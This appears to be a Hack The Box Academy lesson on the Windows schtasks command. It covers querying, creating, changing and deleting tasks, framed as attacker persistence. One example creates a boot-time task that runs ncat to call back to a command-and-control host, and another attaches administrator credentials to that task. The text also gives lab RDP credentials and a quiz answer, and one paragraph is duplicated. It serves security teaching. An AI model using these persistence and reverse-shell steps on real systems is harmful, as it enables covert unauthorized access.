<h3>Working With Scheduled Tasks</h3>

Scheduled tasks are an excellent way for administrators to ensure that tasks they want to run regularly happen, but they are also an excellent persistence point for attackers. In this section, we will discuss using schtasks to:

Learn how to check what tasks exist.

Create a new task to help us automate actions or acquire a shell on the host.

<h3>What Are Scheduled Tasks?</h3>

The Task Scheduler allows us as admins to perform routine tasks without having to kick them off manually. The scheduler will monitor the host for a specific set of conditions called triggers and execute the task once the conditions are met.

Story Time: On several engagements, while pentesting an enterprise environment, I have been in a position where I landed on a host and needed a quick way to set persistence. Instead of doing anything crazy or pulling down another executable onto the host, I decided to search for or create a scheduled task that runs when a user logs in or the host reboots. In this scheduled task, I would set a trigger to open a new socket utilizing PowerShell, reaching out to my Command and Control infrastructure. This would ensure that I could get back in if I lost access to this host. If I were lucky, when the task I chose ran, I might also receive a SYSTEM-level shell back, elevating my privileges at the same time. It quickly ensured host access without setting off alarms with antivirus or data loss prevention systems.

Triggers That Can Kick Off a Scheduled Task

When a specific system event occurs.

At a specific time.

At a specific time on a daily schedule.

At a specific time on a weekly schedule.

At a specific time on a monthly schedule.

At a specific time on a monthly day-of-week schedule.

When the computer enters an idle state.

When the task is registered.

When the system is booted.

When a user logs on.

When a Terminal Server session changes state.

This list of triggers is extensive and gives us many options for having a task take action. Now that we know what scheduled tasks are and what can make them actionable, it is time to look at using them.

<h3>How To Utilize Schtasks</h3>

In the sections provided below, we will go over exactly how we can utilize the schtasks command to its fullest extent. Additionally, as we go over them in greater detail, a formatted table providing the syntax for each action will be provided.

Note that the sections provided here are not an end-all-be-all. Several of the repetitive parameters have been omitted. Be sure to check the help menu /? to see a complete list of what can be used.

<h3>Display Scheduled Tasks:</h3>

<h3>Query Syntax</h3>

<table border="1">
  <tr>
    <th>Action</th>
    <th>Parameter</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>Query</td>
    <td></td>
    <td>Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.</td>
  </tr>
  <tr>
    <td></td>
    <td>/fo</td>
    <td>Sets formatting options. We can specify to show results in the Table, List, or CSV output.</td>
  </tr>
  <tr>
    <td></td>
    <td>/v</td>
    <td>Sets verbosity to on, displaying the advanced properties set in displayed tasks when used with the List or CSV output parameter.</td>
  </tr>
  <tr>
    <td></td>
    <td>/nh</td>
    <td>Simplifies the output using the Table or CSV output format. This switch removes the column headers.</td>
  </tr>
  <tr>
    <td></td>
    <td>/s</td>
    <td>Sets the DNS name or IP address of the host we want to connect to. Localhost is the default specified. If /s is utilized, we are connecting to a remote host and must format it as "\\host".</td>
  </tr>
  <tr>
    <td></td>
    <td>/u</td>
    <td>This switch will tell schtasks to run the following command with the permission set of the user specified.</td>
  </tr>
  <tr>
    <td></td>
    <td>/p</td>
    <td>Sets the password in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The /u and /p values are only valid when used with the /s parameter.</td>
  </tr>
</table>

We can view the tasks that already exist on our host by utilizing the schtasks command like so:

C:\htb> SCHTASKS /Query /V /FO list

Folder: \  

HostName:                             DESKTOP-Victim

TaskName:                             \Check Network Access

Next Run Time:                        N/A


Chaining our parameters with Query allows us to format our output from the standard bulk into a list with advanced settings. The above output shows how the tasks would look in a list format.

<h3>Create a New Scheduled Task:</h3>

<h3>Create Syntax</h3>

<table border="1">
  <tr>
    <th>Action</th>
    <th>Parameter</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>Create</td>
    <td></td>
    <td>Schedules a task to run.</td>
  </tr>
  <tr>
    <td></td>
    <td>/sc</td>
    <td>Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.</td>
  </tr>
  <tr>
    <td></td>
    <td>/tn</td>
    <td>Sets the name for the task we are building. Each task must have a unique name.</td>
  </tr>
  <tr>
    <td></td>
    <td>/tr</td>
    <td>Sets the trigger and task that should be run. This can be an executable, script, or batch file.</td>
  </tr>
  <tr>
    <td></td>
    <td>/s</td>
    <td>Specify the host to run on, much like in Query.</td>
  </tr>
  <tr>
    <td></td>
    <td>/u</td>
    <td>Specifies the local user or domain user to utilize.</td>
  </tr>
  <tr>
    <td></td>
    <td>/p</td>
    <td>Sets the password of the user-specified.</td>
  </tr>
  <tr>
    <td></td>
    <td>/mo</td>
    <td>Allows us to set a modifier to run within our set schedule. For example, every 5 hours or every other day.</td>
  </tr>
  <tr>
    <td></td>
    <td>/rl</td>
    <td>Allows us to limit the privileges of the task. Options here are Limited and Highest. Limited is the default value.</td>
  </tr>
  <tr>
    <td></td>
    <td>/z</td>
    <td>Will set the task to be deleted after completion of its actions.</td>
  </tr>
</table>

Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following:

/create : to tell it what we are doing

/sc : we must set a schedule

/tn : we must set the name

/tr : we must give it an action to take

Everything else is optional. Let us see an example below of how we could create a task to help us get a shell.

<h3>New Task Creation</h3>

C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.

A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down. We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.

Now let us look at what modifying a task would look like.

<h3>Change the Properties of a Scheduled Task</h3>

A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down. We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.

Now let us look at what modifying a task would look like.

<h3>Change the Properties of a Scheduled Task</h3>

<h3>Change Syntax</h3>

<table border="1">
  <tr>
    <th>Action</th>
    <th>Parameter</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>Change</td>
    <td></td>
    <td>Allows for modifying existing scheduled tasks.</td>
  </tr>
  <tr>
    <td></td>
    <td>/tn</td>
    <td>Designates the task to change.</td>
  </tr>
  <tr>
    <td></td>
    <td>/tr</td>
    <td>Modifies the program or action that the task runs.</td>
  </tr>
  <tr>
    <td></td>
    <td>/ENABLE</td>
    <td>Change the state of the task to Enabled.</td>
  </tr>
  <tr>
    <td></td>
    <td>/DISABLE</td>
    <td>Change the state of the task to Disabled.</td>
  </tr>
</table>

Ok, now let us say we found the hash of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use.

C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.

Now to make sure our changes took, we can query for the specific task using the /tn parameter and see:

C:\htb> schtasks /query /tn "My Secret Task" /V /fo list 

Folder: \

HostName:                             DESKTOP-Victim

TaskName:                             \My Secret Task

It looks like our changes were saved successfully. Managing tasks and making changes is pretty simple. We need to ensure our syntax is correct, or it may not fire. If we want to ensure it works, we can use the /run parameter to kick the task off immediately. We have queried, created, and changed tasks up to this point. Let us look at how to delete them now.

<h3>Delete the Scheduled Task(s)</h3>

<h3>Delete Syntax</h3>

<table border="1">
  <tr>
    <th>Action</th>
    <th>Parameter</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>Delete</td>
    <td></td>
    <td>Remove a task from the schedule.</td>
  </tr>
  <tr>
    <td></td>
    <td>/tn</td>
    <td>Identifies the task to delete.</td>
  </tr>
  <tr>
    <td></td>
    <td>/s</td>
    <td>Specifies the name or IP address to delete the task from.</td>
  </tr>
  <tr>
    <td></td>
    <td>/u</td>
    <td>Specifies the user to run the task as.</td>
  </tr>
  <tr>
    <td></td>
    <td>/p</td>
    <td>Specifies the password to run the task as.</td>
  </tr>
  <tr>
    <td></td>
    <td>/f</td>
    <td>Stops the confirmation warning.</td>
  </tr>
</table>

C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?

Running schtasks /delete is simple enough. The thing to note is that if we do not supply the /F option, we will be prompted, like in the example above, for you to supply input. Using /F will delete the task and suppress the message.

Schtasks can be a great way to leverage the host to run actions for us as admins and pentesters. Take some time to practice creating, modifying, and deleting tasks. By now, we should be comfortable with cmd.exe and its workings. Let's level up and start working in PowerShell!

 True or False: A scheduled task can be set to run when a user logs onto a host?
 
True

 RDP to with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  Access the target host and take some time to practice working with Scheduled Tasks. Type 
COMPLETE as the answer when you are ready to move on.

COMPLETE
